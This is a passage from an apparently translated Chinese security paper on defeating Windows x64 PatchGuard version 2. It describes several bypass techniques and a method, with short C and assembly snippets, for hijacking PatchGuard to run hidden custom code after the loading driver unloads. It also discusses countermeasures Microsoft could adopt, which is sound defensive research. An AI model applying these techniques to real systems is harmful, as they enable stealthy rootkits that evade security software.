系统完整性例程在内存中、以明文形式存在的确切位置。此外，它还让攻击者有可能在系统完整性检查的最开始，就对执行上下文做出任何想要的改动，而这可以被轻而易举地利用，例如直接从系统完整性检查逻辑中立即返回，根本不实际验证系统的完整性（因为 Dr7 是在执行任何完整性检查之前就被清零的）。这种方法实际上又把 PatchGuard 的一个保护机制反过来用在了它自己身上，利用其反调试寄存器行为来检测（并阻断）PatchGuard。

这种方法背后的总体思路与技术 4.4 中所描述的类似。与技术 4.4 相同的方式，采用这种方法的人需要取得对调试陷阱处理程序的控制权。为完成这一任务，可以使用技术 4.4 中提出的任何一种方法。在确立对调试陷阱处理程序的控制之后，攻击者就必须设置 Dr7 中的通用检测位，然后等待 PatchGuard 访问调试寄存器。应当注意，在合法执行的过程中，内核自身也经常会直接访问调试寄存器，例如在上下文切换期间，或者在调用 NtSetContextThread / NtGetContextThread 时。任何此类技术的实现都必须能够区分 PatchGuard 对调试寄存器的访问和合法访问。这可以轻而易举地实现：检查陷阱发生时 RIP 的值是否位于一个有效的内核映像之内，因为 PatchGuard 系统完整性检查例程驻留在动态分配的非分页池中，而不是位于内存中内核映像的范围之内。

当调试陷阱处理程序因 PatchGuard 清零 Dr7 而被调用时，希望禁用 PatchGuard 的第三方驱动程序就可以采取适当的行动（这可以简单到直接从系统完整性检查例程中硬返回）。

与那些利用 PatchGuard 使用 SEH 来混淆对系统完整性检查例程的调用的技术一样，这种方法也依赖于把 PatchGuard 的防御机制之一反过来用在它自己身上。最明显的对策自然就是去掉清零调试寄存器的这一行为。然而，禁用这一行为可能并不十分可取，因为那样一来，检测 PatchGuard 就会变得非常容易，例如在内核代码上设置一个读断点，然后等待 PatchGuard 执行一次读取。由于对内核代码的读取（与执行取指相对）相当不典型，这会打开另一种可以轻易绕过 PatchGuard 的简单机制。

微软在这里的最佳做法，是让区分对调试寄存器的合法访问与 PatchGuard 自身的访问变得尽可能困难，不过这一点很可能并不十分可行。在调试陷阱路径上放置额外的验证检查，以加强该路径抵御拦截的能力，或许也有助于对抗这一技术，尽管其效果很可能有限，而且容易被绕过。

### 4.6) Patching the Kernel Timer DPC Dispatcher（修补内核定时器 DPC 分发器）

目前，PatchGuard 利用一个带有关联 DPC（Deferred Procedure Call，延迟过程调用，即推迟到较低中断级执行的内核回调机制）的定时器，把控制权转移给十个可能的合法 DPC 例程中预先选定的一个，这些例程都经过了轻微修改以供 PatchGuard 使用。由于第三方内核驱动程序被提供了一个有文档记录且已导出的接口，可以创建带有关联 DPC 例程的定时器，这就构成了 PatchGuard 的一个弱点，因为它在 PatchGuard 系统完整性检查例程的关键执行路径上呈现出一个易于检测的位置，第三方驱动程序可以相对容易地攻破它。这一技术专注于取得对定时器 DPC 分发器的控制权，目标是检测 PatchGuard DPC 即将被分发的时刻。当检测到 PatchGuard DPC 时，第三方驱动程序就可以完全跳过 PatchGuard DPC 例程，从而禁用 PatchGuard。

为了实现这一点，第三方驱动程序需要定位内核定时器 DPC 分发器内部那条确切的指令，该指令负责调用定时器 DPC 例程。幸运的是，对于一个驱动程序来说，这是一项相当容易的任务，因为创建带有关联 DPC 和 DPC 例程的定时器的接口都是有文档记录且已导出的。具体来说，第三方驱动程序可以排入一个定时器 DPC，然后在该定时器 DPC 例程被调用时，通过检查它的返回地址，记录下 DPC 分发器例程的地址。从那里开始，驱动程序就可以推导出那条调用指令的地址，该指令负责调用与一个 DPC 对象关联的 DPC 例程，而该 DPC 对象又与一个定时器关联。

此时，第三方驱动程序需要做的全部事情，就是修补 DPC 分发器中的那条调用指令，把执行控制权转移到该驱动程序的代码。从那里开始，驱动程序可以过滤所有定时器 DPC，寻找 PatchGuard DPC 例程（例如，寻找 DeferredContext 中一个虚假的内核地址，同时搭配一个位于内存中内核映像范围之内的 DPC 例程）。当检测到 PatchGuard DPC 时，驱动程序可以拒绝调用该 DPC 例程，转而只是在逻辑上原始指令流中那条调用指令之后，把控制权返回给内核 DPC 分发器。这有效地阻止了 PatchGuard 永远运行系统完整性检查，这同样让该驱动程序可以自由地修补内核，而无需担心 PatchGuard 的干预。

在作者看来，防止这种方法的最佳方式，是使用多种不同的机制来启动 PatchGuard 检查例程的执行。例如，也可以使用一个专用的、等待在一个定时器上的线程，或者可以修改一个被频繁调用的系统例程，让它定期调用 PatchGuard。只要对 PatchGuard 的调用都汇聚到一个位置，例如定时器 DPC 分发器，整个 PatchGuard 完整性检查系统就有被第三方驱动程序一举轻易绕过的风险。

### 4.7) Searching for the PatchGuard DPC（搜索 PatchGuard DPC）

PatchGuard 目前使用一个 KTIMER 对象和一个与之关联的 KDPC 对象，两者都分配在非分页池内存中，作为周期性触发器，用来启动 PatchGuard 的系统完整性检查例程。应当有可能在内存中定位这个定时器对象并取消它，从而阻止 PatchGuard 执行。

这一技术的实现本质上是一种经典的 egghunt（蛋猎，即按特征在内存中扫描搜寻目标对象）风格的搜索，遍历非分页池，并附有一些专门定义的、关于如何找到目标的限制条件。具体来说，人们要寻找的是一块符合以下标准的内存区域：

  1. 这块内存是一个有效的 KTIMER 对象。这意味着其链表条目应当有效，并指向其他看起来有效的 KTIMER 对象（或链表头），并且 KTIMER 的类型字段应当与一个定时器对象相符。
  2. 该定时器应当具有一个数分钟量级的定时间隔。PatchGuard 会对定时间隔施加一个随机化的模糊因子（在一个小范围内），但验证该定时器的范围不超过数分钟（比如 7 或 8 分钟）应当是一个充分的健全性检查。
  3. 该定时器应当有一个与之关联的 KDPC（并且该指针应当是有效的非分页池）。
  4. 关联的 KDPC 应当具有适当的类型字段。
  5. 关联的 KDPC 应当具有一个位于内存中内核映像范围之内的 DPC 例程。
  6. 关联的 KDPC 应当具有一个非规范（non-canonical）内核地址形式的 DeferredContext 值。

在找到该 DPC 之后，只需取消它就可以禁用 PatchGuard。可以用来防止技术 4.6 的类似方法也适用于这里。具体来说，通往 PatchGuard 执行的路径集合的多样化，会使像这样一种针对单一路径（例如定时器 DPC 分发器）的技术，在阻断 PatchGuard 方面效果降低。

### 4.8) TLB Desynchronization (Split TLB)（TLB 去同步化〔分离 TLB〕）

所有支持保护模式和分页的 x86 处理器都采用一种缓存方案，以加快虚拟地址到物理地址的翻译。这种方案通过一组 Translation Lookaside Buffers（转址旁路缓存），即 TLB（高速缓存页表项的硬件缓存，用以缓存某个虚拟地址对应的页属性及关联的物理地址）来实现。近期的 x86 处理器（Pentium II 级别或更高）利用多组 TLB，例如一组用于数据访问的 TLB 和一组用于指令访问的 TLB。在正常的系统运行中，两个 TLB（如果一颗处理器支持多个 TLB）对某个特定页的属性保持一致的视图；然而，故意使这些 TLB 的内容去同步化（desynchronize）是可能的，从而维持一种假象：同一个页具有不同的属性，具体取决于它是作为数据被引用还是作为可执行代码被引用。TLB 的这种故意去同步化有许多用途，从实现不可执行支持（被 GNU/Linux 上的 PaX/GRsec 所利用 [6]），到 ``memory cloaking''（内存伪装），一种 rootkit 经常使用的技术：当内存被一个读操作作为数据引用时提供内存的一种视图，而当内存被一次指令取指引用时则提供内存的另一种不同视图。同一种曾吸引 rootkit 开发者用以把 rootkit 隐藏起来、躲避检测的内存伪装技术，也可以用来向 PatchGuard 的完整性检查隐藏内核修补。严格来说，这一拟议技术并不是 PatchGuard 的一种绕过机制；相反，它是一种向 PatchGuard 隐藏内核修补的机制，从而使 PatchGuard 对正在修补内核的第三方无害化。

这种方法的细节在许多方面本质上与任何实现 split-TLB（分离 TLB，即让指令 TLB 与数据 TLB 对同一页保持不同视图的 TLB 去同步化手法）方法的程序类似，这种程序基于执行取指或读取取指来改变页属性或内容。关于如何实现这一点的确切细节超出了本文的范围，并在其他地方有所讨论：由 PaX 团队讨论（在旧平台上实现不可执行的语境下）[6]，以及由 Sherri Sparks 和 Jamie Butler 讨论（在实现一个利用分离 TLB 来实现所谓 ``memory cloaking'' 的 Windows rootkit 的语境下）[7]。鼓励感兴趣的读者查阅这些参考文献，以了解关于一般分离 TLB 概念如何实现的原始细节。尽管所引用的文章直接适用于 x86，但这些概念在原理上也适用于 x64，并且很可能只需极少的修改就可以在 x64 上工作。

在人们已经建立了一种使 TLB 去同步化的机制之后（例如通过钩住页错误处理程序），这一技术推荐的做法是：对内核中人们正在执行传统的基于操作码替换的修补或钩挂的任何区域，使其 TLB 去同步化。具体来说，当在一个已经就地实施了基于操作码替换的修补的页上，为执行而读取内核代码时，应当返回被修补过的页。如果为一次数据引用而读取内核代码（例如 PatchGuard 为验证其完整性而读取内核代码），则应当返回原始数据。这一技术有效地向除直接执行之外的任何访问隐藏了对内核代码的所有修改，这就阻止了 PatchGuard 检测到内核代码已被第三方更改。

注意，为了使这种方法成功，页错误处理程序上的钩子本身必须对 PatchGuard 隐藏。这不能直接通过同一种 TLB 去同步化策略来完成，因为页错误处理程序必须保持驻留。可能需要一种组合方法，例如在页错误处理程序上使用一个调试断点（同时结合一个被颠覆的调试陷阱处理程序，或许通过先前在技术 3 中描述的 PsInvertedFunctionTable），再加上一种阻止 PatchGuard 禁用基于调试寄存器的断点的方案（例如技术 5 中所描述的），以便以一种对 PatchGuard 真正透明的方式钩住页错误处理程序。

针对这种方法，最合乎逻辑的防御是尝试检测页错误分发路径是否已被攻破。因为 TLB 去同步化一般不能用来隐藏页错误处理程序本身（页错误处理程序必须在内存中保持标记为存在），第三方要向内核隐瞒对页错误处理程序的更改将是困难的。这种困难将以有限的几种方式表现出来，即更改页错误处理程序可以被隐藏的方式，例如巧妙地利用调试寄存器。其结果是，防止这一技术保持可行的关键，是开发一种让 PatchGuard 能够检测到页错误钩子的方法。例如，如果调试陷阱处理程序和页错误处理程序上的一个调试断点被用来在页错误时取得控制权，那么微软或许能够通过阻断或检测对调试陷阱处理程序的拦截来防止这一技术。一种这样的方法可能是更好地保护 PsInvertedFunctionTable，它代表了一种第三方可以在 PatchGuard 不知情的情况下颠覆调试陷阱处理程序的简易方式。不过，这类对策将根据用来隐藏页错误处理程序钩子的机制而有所不同。

### 4.9) DPC Routine Patching（DPC 例程修补）

作为技术 4.2 的一种变体，一种禁用 PatchGuard 的非常简单直接的方法，就是简单地钩住每一个可能的 DPC 例程，检查该 DPC 是否很可能是为了执行 PatchGuard 的系统完整性检查而被调用的，如果是，就简单地从该 DPC 返回到内核定时器 DPC 分发器。为了实现这种方法，人们首先需要定位每一个可能的 DPC 例程。技术 4.2 列出了若干可行的算法，用来对每一个 DPC 例程进行指纹识别（并定位）；该技术中建议的任何算法（最好是多个算法）都将直接适用于这一拟议方法。

在人们已经识别出所有可能的 DPC 例程之后，剩下的全部事情就是修补每一个例程，使其分支到驱动程序控制的代码。从那里开始，驱动程序可以作出决定：该 DPC 是被合法调用的，还是作为 PatchGuard 系统完整性检查过程的一部分被调用的（通过作为 DeferredContext 传入的一个非规范内核地址可以很容易地识别出来）。如果该 DPC 与 PatchGuard 有关，那么驱动程序为阻断 PatchGuard 所需要做的全部事情，就是立即返回到 DPC 分发器。

从微软的观点来看，这种方法相当容易防止。因为它是基于特征码的，微软可以实现的一种可能的反制方法是：确定第三方驱动程序用来检测 PatchGuard DPC 的是哪些特征码，并在下一个 PatchGuard 版本中更改 PatchGuard DPC 例程，使其不匹配那些特征码。微软也可以改变 DPC 例程的数量，以打乱那些假定 PatchGuard 将恰好使用十个 DPC 的驱动程序，或者微软可以切换到 DPC 之外的一种替代传递机制，以防止现有的、检测并钩挂特定 DPC 例程的代码阻断 PatchGuard。

## 5) Subverting PatchGuard（策反 PatchGuard）

PatchGuard（内核补丁保护，微软用于防止第三方修改内核关键代码与数据的机制）目前拥有一整套令人生畏的防御机制，其目的就是让逆向工程（reverse engineering，即通过分析程序二进制来还原其设计与实现）和调试变得困难。鉴于微软目前还没有能够让 PatchGuard 由硬件强制执行的基础设施，可以说这大概就是微软在短期内真正能做到的最好程度了。他们所能构建的，只是一个基于混淆（obfuscation，即故意把代码和数据改造成难以理解的形式）和反调试技术的系统，试图让第三方难以检测、禁用或绕过它。

还有其他类别的软件，也试图建立与 PatchGuard 类似的防御。然而，这些其他类别的软件，其目的通常远比阻止第三方给内核打补丁要邪恶得多。具体而言，反调试、反逆向工程和自解密代码（self-decrypting code，即代码在运行前才把自身解密、平时以密文形态存放）经常被用来在已被攻陷的系统上隐藏病毒、rootkit（隐藏自身并维持特权访问的恶意软件）和其他恶意软件。

尽管微软采用这些防御机制的本意（可以说）是出于一个良好的目的，但这些保护 PatchGuard 免受第三方驱动程序攻击的反调试、反检测和反逆向工程技术，同样可以被策反，用来保护自定义代码，使其不被防病毒软件或反 rootkit 软件检测或分析。就这一点而言，微软制造了一把双刃剑：那套守护 PatchGuard、抵御第三方软件的精巧混淆和反调试方案，同样可以用来守护恶意软件、抵御系统安全软件。事实上，完全有可能策反 PatchGuard 第 2 版的众多防御，让它执行自定义代码，而不是 PatchGuard 的系统完整性检查例程。做到这一点虽然称不上轻而易举，却远非不可能。

要想策反 PatchGuard、让它听命行事，首先必须——可以说——当场抓住 PatchGuard。为此，作者建议从前面提出的一种绕过技术入手。例如，考虑第一种被提出的绕过技术：作者在其中建议挂钩（hooking，即拦截并接管某个函数的调用）`_C_specific_handler`（C 语言特定的异常处理分发函数），以便在 PatchGuard 的 DPC 例程（DPC，即 Deferred Procedure Call，延迟过程调用，是内核在降低后的中断请求级别上排队执行工作的机制）为触发系统完整性检查的执行而生成的异常处，截获执行控制权。实现这一绕过技术，就能直接访问 PatchGuard DPC 例程内部的机器上下文（machine context，即异常发生那一刻的寄存器等处理器状态），而这个机器上下文里包含着定位 PatchGuard 系统完整性检查例程所必需的信息。

既然目标是把系统完整性检查例程改作他用、让它执行自定义代码，这就是一个很好的起点。然而，确定系统完整性检查例程的位置，要比干脆跳过 PatchGuard 的全部检查复杂得多；指向该例程的指针，是根据 DPC 的原始参数（即 `Dpc` 参数和 `DeferredContext` 参数，DeferredContext 是 DPC 被排队时随之保存、待 DPC 运行时再交回给它的上下文值）加密而成的。此外，PatchGuard DPC 的原始参数此时已经被从寄存器转移到栈上，并被混淆（以一个魔法常数向左或向右循环移位）。由于参数寄存器里的原始内容会被 DPC 例程在触发访问违例（access violation，因访问无效或无权限地址而产生的异常）之前故意覆盖掉，所以别无选择，只能想办法把 DPC 参数从调用者的栈里捞出来。这实际上颇具挑战性，因为这样一种方法必须对所有内核版本都有效，也必须对所有不同的 DPC 变体都有效。既然这一组可能性意味着数量大到无法维护的例程——要逐个逆向工程才能确定各自的循环移位混淆值和栈偏移——那就必须采取一种更通用的方法来定位栈上的原始参数。要创建这样一种通用方法，就必须更仔细地查看每个 DPC 例程的头几条指令（即直到故意触发访问违例为止的那部分）。尽管 PatchGuard 已经设置了若干障碍，阻止人们轻易地从这一上下文中取回原始参数，但其中可能存在某种模式或弱点，可以被利用来恢复所要找的参数。

就访问违例发生时的机器上下文而言，每个 DPC 例程共有的基本情况是：

1. 原始参数已经以混淆后的形式存放在栈上（以一个任意的魔法常数向左或向右循环移位）。

2. 访问违例总是通过解引用 `rax` 而发生的。在这里，`rax` 总是 `DeferredContext` 参数去混淆后的形式。这就等于白送了我们一个参数，因为在访问违例发生时寄存器上下文中的 `rax`，总是明文的 `DeferredContext` 值。

3. 存放 `Dpc` 参数的栈位置，在不同的 DPC 版本之间差异极大。此外，它在同一操作系统家族内的不同内核风格之间、以及不同操作系统家族之间，也各不相同。因此，把这个参数的栈位移硬编码下来并不实际。

4. 紧挨在出错指令之前的那条指令，总是形如 `ror rax, <magical constant>` 的指令。在这里，这个魔法常数是一个立即数，也就是说，它被编码为这条指令操作码本身的一部分。每个 DPC 都有自己独一无二的魔法常数，而且，对某一种特定的 DPC 风格而言，所用的魔法常数在所有内核风格和操作系统家族之间都不会改变。这就给了我们一种很好的办法，可以从 `_C_specific_handler` 挂钩的上下文中迅速识别出当前用的是十个 PatchGuard DPC 中的哪一个（而不必做难看的代码指纹识别或分析）。遗憾的是，我们仍然没有办法确定 `Dpc` 参数的栈位移。

5. `r8` 寄存器总是等于原始的 `Dpc` 参数向右移位后的结果，移位量为 `DeferredContext` 参数的低字节。尽管这看起来诱人地接近我们要找的东西，但它实际上不能被用作原始 `Dpc` 参数的替代品，哪怕在这里 `DeferredContext` 参数已经已知（因为 `rax` 的值已知）。这是因为右移操作是破坏性的：随着比特被向右移出寄存器、消失无踪，信息会被永久丢失。因此，取决于 `DeferredContext` 参数的低字节，`Dpc` 参数中的重要比特，可能已经在存放在 `r8` 里的这个伪副本中被永久丢失了。

尽管局面乍看之下可能很严峻，但事实上，凭借上述信息仍然有可能定位 `Dpc` 参数；所需要的只是一点工作（以及把手弄脏、用上一些难看的技巧）。具体而言，可以用暴力攻击在 DPC 例程的栈帧（stack frame，即一次函数调用在栈上占用的那片区域）中搜索 `Dpc` 参数。这确实谈不上优雅，但它能把事情办成。有若干线索可以用来提高在栈上成功找到真正的 `Dpc` 参数的概率：

1. 由于 x64 调用约定的要求，栈至少是 8 字节对齐的，而且微软的 C/C++ 编译器总是把指针大小的值放在栈上 8 字节对齐的位置。因此，搜索范围可以缩小到栈上 8 字节对齐的位置，而不必逐字节搜索。

2. 因为当前 DPC 例程的身份已经已知（这是通过分析紧挨在出错的 `mov eax, [rax]` 指令之前的 `ror` 指令得出的），所以用来混淆 `Dpc` 参数的循环移位常数也就已知。每个 DPC 例程都有自己独一无二的魔法循环移位常数，而既然当前 DPC 例程已经被确切地识别出来，那么用来在栈上混淆 `Dpc` 参数的循环移位常数也随之已知。

3. 要快速检查栈上的某个值有没有可能是 `Dpc` 参数，可以把栈上的这个值按已知的混淆常数循环移位，然后把结果向右移位 `DeferredContext` 参数低字节所给出的量，再把结果与异常发生时 `r8` 的值相比较。如果不匹配，那么当前这个栈位置就可以从搜索中排除。这并不能给出一个肯定的匹配，但它确实提供了一种肯定地排除各种可能性的办法。这一步也是可选的，因为即便不依赖 `r8`，仍然有可能定位 `Dpc` 参数；与 `r8` 的核对只不过是一种优化。

4. `Dpc` 参数应当指向一个有效的非分页池（non-paged pool，内核中不会被换出到磁盘、随时可访问的内存池）地址，因为它必须代表一个有效的内核指针。为了检查这一点，可以用 `MmIsAddressValid`（内核提供的、用于测试某个地址是否有效的函数）来测试所讨论的去混淆后的值是不是一个有效的指针。（是的，`MmIsAddressValid` 有点竞态条件（race condition，即结果取决于两个执行流相对时序的隐患）的味道，而且肯定是个凑合的办法。作者想指出的是，前面已经把这种方法描述为要求实现者把自己的“手弄脏、用上一些难看的技巧”，这是想抢先堵住那些不可避免的抱怨——有些人可能会斥责这种方法是个令人难以下咽的丑陋凑合办法。）

5. `Dpc` 参数应当指向一个有效的非分页池地址，其长度应当大到足以容纳一个 `KDPC` 对象（内核内部表示一个 DPC 的数据结构），外加至少一个指针大小的附加字段。可以用第二次 `MmIsAddressValid` 测试来验证：这个指针所描述的有效区域大到足以容纳 `KDPC` 对象，外加紧随其后的那个附加的指针大小字段（即 PatchGuard 的解密密钥）。

6. `Dpc` 参数应当指向一个其 `Type` 和 `DeferredContext` 字段已经被清零的 DPC。（DPC 例程会在故意触发访问违例之前，故意把 DPC 中的这些值清零。）如果被怀疑是 `Dpc` 参数的值在当作 `PKDPC`（指向 `KDPC` 的指针类型）看待时不具备这些性质，那么它就可以被排除出可能性之外。

把这些规则反复应用到从异常发生时的 `rsp`（栈指针寄存器）值向上的一段合理距离内的每一个适用位置上（比如说 256 字节，不过确切的大小可以更大；唯一的要求是，局部变量空间最大的那个 DPC 例程的整个局部变量空间，要完全包含在这个搜索区域之内），就有可能以近乎确定的把握恢复出 `Dpc` 参数。以作者的经验来看，尽管人们凭直觉可能会觉得搜索一个未知的栈帧容易失败或产生误报，但这一技术工作起来相当可靠。

在 PatchGuard DPC 例程的 `Dpc` 和 `DeferredContext` 这两个参数都被恢复出来之后，接下来只需分析 PatchGuard 是如何调用系统完整性检查的，就能确定如何在内存中定位它。这在前面已经讨论过，它归结为以下一组语句：

```c
ULONG64 DecryptionKey, PatchGuardCheckFunction;

DecryptionKey            = *(PULONG64)(Dpc + 0x40);
PatchGuardCheckFunction  = DecryptionKey ^ DeferredContext;
PatchGuardCheckFunction |= 0xFFFFF80000000000;
```

到这一步，几乎就可以把系统完整性检查例程替换成自定义代码了。然而，还有那个讨厌的、在检查函数之前运行的自解密存根（stub，一小段起引导/过渡作用的代码）的问题需要处理。因为 DPC 例程的异常处理程序会在存根的第一条指令被执行之前重写它，所以人们没有太多选择，只能至少为系统完整性检查例程实现一个最基本版本的解密存根。

回想一下，存根中的第一条指令被设置成下面这样：

```
lock xor qword ptr [rcx],rdx
```

查看解密存根的原型可知，`rcx` 对应解密存根自身的地址，`rdx` 对应解密密钥。由于这条指令会同时修改它自身和下一条指令（这条指令长四字节，而这个 xor 操作会改变八个字节），所以系统完整性检查例程的替换代码必须允许第一条指令就是上面那条 xor 指令，并且必须允许第二条指令（至少）最初处于被 xor 混淆的状态。为简单起见，作者选择了实现针对这一难题的最简单的可能方案，也就是把替换代码中的第二条指令做成第一条指令的一份复制。换句话说，替换代码将如下所示：

```
;
; This instruction is forced on us by PatchGuard,
; and cannot be altered; it is rewritten at runtime.
;

lock xor qword ptr [rcx],rdx

;
; The next instruction, conveniently four bytes
; long, re-encrypts itself by xoring the first
; eight bytes of the decryption stub (which includes
; the second instruction) by the decryption key a
; second time;
;

lock xor qword ptr [rcx],rdx

;
; (... any custom code may follow here ...)
;
```

如前所述，在专门构造好替换代码之后，有必要先把第二条指令加密（因为它会被第一条指令立即解密）。这必须在把控制权交还给 PatchGuard 之前完成。

在自定义代码配置完毕、第二条指令被加密之后，剩下的事情就是把自定义代码复制到 PatchGuard 的解密存根之上。当这一步完成之后，PatchGuard DPC 的异常处理程序就会调用所提供的自定义代码，而不是系统完整性检查例程。

然而，这其实还不算多么有趣，因为 PatchGuard 用的是一次性定时器（one-shot timer，即只触发一次、之后不再重复的定时器）。被替换到解密存根位置上的自定义代码将再也不会被运行第二次。考虑到这一点，明智的做法是：在自定义代码块里放一次调用，用来排入一个定时器，并为它关联一个 DPC 例程（指向 PatchGuard 在启动时选中的那个 DPC 例程）。

到这一步，就可以简单地让正常的异常分发过程继续进行（即恢复 `_C_specific_handler` 的执行），此后被调用的将是自定义代码，而不是 PatchGuard。本质上，PatchGuard 不仅已被禁用，而且已被彻底策反：它会在一个第三方驱动程序的控制下调用定制的代码，而不是系统完整性检查。

不过，局面仍然不算最优。目前，`_C_specific_handler` 中仍然有一个挂钩，明摆在那里，谁都看得见（并能认出有人篡改了内核）。此外，最初用来策反 PatchGuard 的那个驱动程序仍然处于已加载状态，这同样可能是一个露馅的迹象，表明有人可能对内核做了见不得人的事。

不过，这些问题同样可以解决。事实表明，在 PatchGuard 被策反之后，从 `_C_specific_handler` 上摘除挂钩是安全的，然后在挂钩移除之后，只需简单地回调进 `_C_specific_handler` 即可。此外，运行被策反的系统完整性检查例程所需要的一切，甚至可以驻留在 PatchGuard 自己的内部数据结构之中；例如，人们可以简单地利用自定义代码之后的额外空间——也就是解密存根和 PatchGuard 检查例程通常会驻留的那片地方——来作一个参数块。这尤其方便，因为自定义代码块会被在 `rcx`（第一个参数）里得到一个指向它自身的指针，而人们很容易给这个指针加上一个已知常数值，从而取回供自定义代码使用的那个参数块。到这一步，驱动程序用来策反 PatchGuard 的自定义代码所需要的全部代码和数据，都位于动态分配的内存之中。鉴于此，最初的那个驱动程序就不再被需要，甚至可以被卸载（以便进一步掩盖内核发生过任何改动这一事实）。在驱动程序被卸载之后，改动发生过的唯一痕迹，就只会剩下已卸载模块列表（很容易修改），以及被重写过的 PatchGuard 系统完整性检查例程本身（它很容易被加强成自解密的——使用一个不同的加密密钥，从而在内存中成为一个极难定位的目标）。

最终结果是：PatchGuard 已被禁用，取而代之的是，任意的自定义代码会被周期性地执行。此外，内存中不存在对内核代码或全局数据的任何修改或补丁，也不存在任何可疑的驱动程序（乃至任何可疑的多余内存分配）。本质上，PatchGuard 已被策反这一事实的唯一痕迹，只会对那些知道如何定位并禁用 PatchGuard 的人（或物）才可见。

所提供的用于策反 PatchGuard 的示例程序相当简单，它并没有利用 PatchGuard 所采用的全部防御技术。例如，它不会在每次执行时更换解密密钥，也没有贯彻做到让整个代码块只在执行之前才解密、其余时间都保持加密。不过，这些特性很容易添加进去，而且会大大增加在内存中定位被策反的 PatchGuard 代码的难度。

## 6) PatchGuard 与“反黑客（Anti-Hack）”系统的未来方向（Future Direction of PatchGuard and "Anti-Hack" Systems）

未来，微软可以采取几条一般化的路子，来显著强化 PatchGuard 抵御攻击的能力。具体而言，这些路子涉及为 PatchGuard 增加冗余，并消除其中的单点故障（single point of failure）。把 PatchGuard 这样一个反黑客系统看作一个关键系统，是常常有帮助的：人们希望它始终保持运行、停机时间越少越好（也就是说，像一个具有高可用性（high-availability）的网络或服务那样）。实现这一目标的合乎逻辑的做法，是找出并消除单点故障，例如通过增加冗余来做到这一点。在一个高可用网络中，人们会通过增加冗余的线缆、交换机之类的东西来做到这一点，使得当其中一个部件失效时，整个系统仍能继续运行，而不是彻底失效。对于 PatchGuard 这样一个反黑客系统，有帮助的做法是为所有关键代码路径都增加冗余，使得不存在这样一个单点：攻击者只需在那里改动一个操作码（opcode）或挂钩（hook）进去，最终结果就能让整个反黑客系统失效。

消除这些单点故障，对一个反黑客系统的长久存续至关重要。在这类情形下需要把握的核心概念是：攻击者永远会试图找出攻破目标系统防御的最容易的办法。如果攻击者只需把一条 jmp 改成一条 nop，就能让精巧的加密与反调试设施根本得不到运行的机会，那么再多的混淆（obfuscation）与加密也起不了多大作用。在这一点上，PatchGuard 当前的实现是有缺陷的。它存在许多不同的单点故障，攻击者可以在单个位置把自己注入进去，从而彻底扰乱 PatchGuard。

针对这一问题，一个可能的解决方案是：确保存在多条不同的代码路径，都能通向 PatchGuard 系统完整性检查中的每一个点。反黑客系统与攻击者之间这场较量的本质，关系到绕过反黑客系统中那个最薄弱环节有多容易。在系统中所有的薄弱环节被同时加固之前，这个系统仍然要容易得多地遭受攻击或绕过。就这一点而言，PatchGuard 第 2 版对系统中那些最薄弱的环节几乎没有改进，因此仍然存在数量极多的办法可以绕过它。更糟的是，每一种绕过技术往往只需要攻击 PatchGuard 的某一个具体方面，就能让它整体失效。

就 PatchGuard 本身而言，微软可以采取的一个办法是：把某种关键的系统功能与 PatchGuard 的系统完整性检查合并到一起，从而显著提高该系统抵御外部干扰的韧性与健壮性。这样一种做法会让潜在攻击者难以简单地绕过对 PatchGuard 的一次调用，因为这样做同时也会绕过某种关键的系统功能，而这种功能（在理想情况下）是系统以任何可用状态运行所必需的。到了这一步，攻击者面对的挑战就转而变成：要么复制 PatchGuard 中所包含的那种关键系统功能，要么找到办法把关键系统功能从 PatchGuard 的系统完整性检查部分中分离出去，要么找到办法完全躲开 PatchGuard 对内核补丁的检测。微软可以把前两点做到任意地困难，尤其是因为关于 Windows 内部机理的知识，想必在微软内部比在微软外部更为丰富。把关键系统功能整合进来，从理论上说对微软来说要比让潜在攻击者靠自己可靠地逆向工程并重新实现这种功能更容易，从而迫使潜在攻击者走那条艰难的路：设法把 PatchGuard 与关键系统功能分离开来。巧妙地运用混淆与反调试技术，恰恰会在这里见到最大的成效，因为攻击者（在最理想的情况下）将别无选择，只能一步步跟踪并彻底理解 PatchGuard，然后才能够复制 PatchGuard 中所包含的关键功能（或者选择性地激活关键功能，而不激活系统完整性检查）。

然而，后一个问题（完全躲开 PatchGuard 的检测）很可能是一个要难处理得多的问题。诸如巧妙利用调试寄存器、TLB（Translation Lookaside Buffer，地址转换后援缓冲器）去同步（TLB desynchronization）以及其他相关攻击之类的技术，极难检测（而且通常非常容易加以改动，以在针对这类攻击的已知检测方案被开发出来之后避开检测）。恰恰在这一方面，微软目前处于极大的劣势。要改进 PatchGuard 以避免这类躲避战术，很可能既困难，相对于攻击者能够多么迅速地适应并抵消微软为增强 PatchGuard 能力所作的努力而言，又是一项回报很差的时间投资。

展望未来，可以预期 PatchGuard 最终会把目前所采用的基于混淆的防御机制，替换为基于硬件的防御机制。特别是，作者预计微软最终会部署一个由近期处理器中存在的基于硬件的虚拟化（也称为 hypervisor，即虚拟机监控程序，运行在操作系统之下、直接管理硬件虚拟化的底层软件层；同时也正在为 Windows Server “Longhorn” 开发，代号为 “Viridian”）支持所增强的 PatchGuard 版本。一个由 hypervisor 守护的 PatchGuard 实现，将能够免于被简单地修补得不复存在（这至少消除了当前版本 PatchGuard 中一些最重大的缺陷），至少只要 hypervisor 本身保持安全、没有可被利用的 bug，就会如此。在一个基于 hypervisor 且带有 PatchGuard 的系统中，第三方驱动将不被允许以 hypervisor 特权执行，从而完全阻止对 PatchGuard 本身的运行时修补（PatchGuard 本身将是享有特权的 hypervisor 层的一部分）。一个基于 hypervisor 的系统还可能能够实现诸如一次写入（write-once）内存之类的概念，这种概念可以被改造用来在一开始就阻止内核被修补——内核最初被加载进内存之后便不许再改——而不是在事后检测修补行为、并以让系统崩溃来回应执行不当行为的第三方驱动。

然而，即便 hypervisor 支持已经就位，预计第三方仍将有办法以未被微软完全授权的方式改变内核的行为。例如，只要为了让内核调试器能够工作而必须保留对调试寄存器的支持，那么要阻止一种利用调试寄存器在内核内任意位置修改执行上下文的做法，可能就会很困难（至少，在不让 hypervisor 完全负责管理与处理器的那一组调试寄存器有关的所有活动的情况下，是如此）。

## 7) 结论（Conclusion）

尽管 PatchGuard 第 2 版在某些方面引入了显著的改进，它仍然容易遭受种类繁多的潜在攻击。此外，颠覆 PatchGuard 整体是可能的（尽管颇为繁复），其目的是以一种难以检测的方式，在 PatchGuard 的位置上运行任意的自定义代码。

